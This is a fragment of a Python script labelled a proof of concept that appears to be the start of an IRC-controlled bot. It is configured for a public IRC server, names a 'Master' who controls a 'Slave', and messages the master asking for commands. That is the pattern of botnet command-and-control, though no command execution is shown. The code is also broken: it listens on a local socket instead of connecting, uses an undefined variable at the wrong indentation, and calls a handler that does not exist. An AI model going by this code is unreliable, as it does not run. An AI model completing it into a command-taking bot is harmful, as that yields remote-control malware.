#!/usr/bin/env python3

# This is just a PoC, and it comes with no warranty or anything.
# Use it at your own risk. it MUST NOT be used in a production environment or anything other than testing.
# PLEASE respect other people's privacy. Only tested on Linux BTW

import asyncio
import os
from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
import time

HOST = "chat.freenode.net"  # You can change this to whatever you want
PORT = 6667

NICK = "Your Nick Name"
IDENT = "Your Identity"
REALNAME = "Your REAL Name"
MASTER = "The Master of this particular Slave"

CHANNEL = "The Channel To join"

readbuffer = ""

loop = asyncio.get_event_loop()

async def initiate_connection(address):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    sock.bind(address)
    sock.listen(5)
    sock.setblocking(False)

s.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER, "UTF-8"))


    while True:
        client, addr = await loop.sock_accept(sock)
        loop.create_task(echo_handler(client))

